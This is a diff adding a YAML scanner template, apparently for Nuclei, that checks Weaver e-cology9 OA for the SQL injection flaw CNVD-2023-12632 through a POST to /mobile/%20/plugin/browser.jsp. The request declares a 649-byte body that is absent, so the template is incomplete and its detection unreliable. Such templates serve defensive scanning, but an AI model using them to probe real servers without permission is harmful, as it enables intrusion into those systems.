@@ -1,0 +1,37 @@
+id: fanweiOA-e-cology9-SQL-sql-injection
+
+info:
+  name: 泛微e-cology9_SQL注入-CNVD-2023-12632
+  author: cnaq
+  severity: high  
+  description: 泛微OA cology9 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEe-cology9_SQL%E6%B3%A8%E5%85%A5-CNVD-2023-12632.md
+  tags: sql,ecology,fanwei,oa
+
+
+requests:
+  - raw:
+      - |
+        POST /mobile/%20/plugin/browser.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 649
+
+    matchers-condition: and  
+    matchers:
+      # 漏洞返回页面无特征，使用过滤方式减少误报
+      # 基本条件1 响应状态
+      - type: status
+        status:
+          - 200
+      # 高级条件 内容必有的单字符
+      - type: word
+        part: body
+        words:
+          - 'autoCount'
+          - 'true'
+        condition: and
+
